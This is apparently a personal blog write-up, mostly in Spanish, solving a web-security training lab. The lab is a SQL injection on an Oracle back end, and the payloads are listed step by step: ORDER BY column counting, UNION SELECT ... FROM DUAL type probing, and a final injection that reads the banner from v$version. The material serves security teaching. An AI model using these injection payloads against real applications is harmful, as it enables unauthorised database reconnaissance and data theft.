---
title: "Lab: SQL injection attack, querying the database type and version on Oracle"
date: 2025-12-28
category: "SQL Injection"
order: 8
tags: ["web-security-academy", "sql-injection", "lab", "oracle"]
layout: layouts/writeup.njk
permalink: /writeups/sql-injection-lab-version-oracle.html
---

This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.

---

## Paso 1 — Encontrar el número de columnas

```sql
' ORDER BY 3-- → Internal error → 3-1 = 2 columnas
```

## Paso 2 — Encontrar el tipo de dato de cada columna

```sql
' UNION SELECT 'a', NULL-- → Error, la columna no acepta str
' UNION SELECT NULL, 'a'-- → Error, la columna no acepta str
```

Ambas dieron error — esto es una pista de que la base de datos es **Oracle**. En su documentación se menciona que el statement `SELECT` debe ir acompañado del `FROM` y de la tabla de la que se quiere retornar data, pero cuando la data no viene de ninguna tabla se puede usar la pseudo-tabla `DUAL`.

```sql
' UNION SELECT 'a', NULL FROM DUAL-- → No error, acepta str
' UNION SELECT NULL, 'a' FROM DUAL-- → No error, acepta str
```

## Paso 3 — Consultar la versión de la base de datos

Investigando, el query para retornar la versión en Oracle es:

```sql
SELECT banner FROM v$version WHERE banner LIKE 'Oracle Database%'
-- Output: Oracle Database 10g Release 10.2.0.4.0 - 64bit Production
```

Payloads probados:

```sql
' UNION SELECT NULL, banner FROM v$version WHERE banner LIKE 'Oracle Database%'--
' UNION SELECT * FROM PRODUCT_COMPONENT_VERSION--
' UNION SELECT NULL, banner from v$version--  ← este sí funcionó
```

## Resultado ✅

El payload final devolvió el string de versión de la base de datos Oracle en la respuesta de la aplicación. Lab resuelto.
